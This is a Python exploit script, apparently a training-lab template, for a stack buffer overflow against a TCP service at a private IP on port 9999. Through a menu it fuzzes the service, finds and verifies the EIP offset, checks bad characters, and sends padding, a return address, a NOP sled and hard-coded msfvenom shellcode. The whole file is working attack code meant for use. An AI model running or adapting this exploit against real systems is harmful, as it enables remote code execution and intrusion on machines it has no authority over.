#!/usr/bin/env python3

from logging import exception
import socket, time, sys

ip = "10.10.204.116"  # Change
port = 9999  # Change
prefix = ""  # Change if one is used
timeout = 5
payload = ""  # Change
offset = 0  # Change after finding offset in step 2
overflow = "A" * offset
eip = "\xF3\x12\x17\x31"  # Change before step 6
nopsled = "\x90" * 32  # Adjust if needed
shellcode = (
    "\xda\xc7\xbe\xe7\x7d\x94\xae\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
    "\x12\x31\x70\x17\x83\xc0\x04\x03\x97\x6e\x76\x5b\x66\x4a\x81"
    "\x47\xdb\x2f\x3d\xe2\xd9\x26\x20\x42\xbb\xf5\x23\x30\x1a\xb6"
    "\x1b\xfa\x1c\xff\x1a\xfd\x74\x0a\xd6\xd2\xe4\x62\xea\x2c\xc3"
    "\x62\x63\xcd\xbb\xe5\x23\x5f\xe8\x5a\xc0\xd6\xef\x50\x47\xba"
    "\x87\x04\x67\x48\x3f\xb1\x58\x81\xdd\x28\x2e\x3e\x73\xf8\xb9"
    "\x20\xc3\xf5\x74\x22"
)  # msfvenom payload output

menu_options = {
    1: "Fuzzer",
    2: "Get Offset",
    3: "Verify Offset",
    4: "Generate BadChars",
    5: "Check BadChars",
    6: "Exploit !",
    0: "Exit",
}


def print_menu():
    for key in menu_options.keys():
        print(key, "--", menu_options[key])


while True:
    print_menu()
    option = int(input("Enter your choice: "))

    if option == 1:
        buffer = prefix + "A" * 100
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    s.connect((ip, port))
                    #s.recv(1024)
                    print("Fuzzing with {} bytes".format(len(buffer) - len(prefix)))
                    s.send(bytes(buffer + "\r\n", "latin-1"))
                    #s.recv(1024)
            except Exception as e:
                print(e)
                print("Fuzzing crashed at {} bytes".format(len(buffer) - len(prefix)))
                sys.exit()
            buffer += 100 * "A"
            time.sleep(2)

    elif option == 2:
        buffer = prefix + payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            print("Sending the buffer...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
        except:
            print("Could not connect.")
        exit()

    elif option == 3:
        buffer = prefix + overflow + eip
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            print("Sending the buffer...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
        except:
            print("Could not connect.")
        exit()

    elif option == 4:
        for x in range(1, 256):
            print("\\x" + "{:02x}".format(x), end="")
        print()
        exit()

    elif option == 5:
        buffer = prefix + overflow + eip + payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            print("Sending the buffer...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
        except:
            print("Could not connect.")
        exit()

    elif option == 6:
        buffer = prefix + overflow + eip + nopsled + shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            print("Sending the buffer...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
            print("Done!")
        except:
            print("Could not connect.")
        exit()

    elif option == 0:
        print("Exiting .....")
        sys.exit()

    else:
        print("Invalid option. Please enter a number between 1 and 6.")
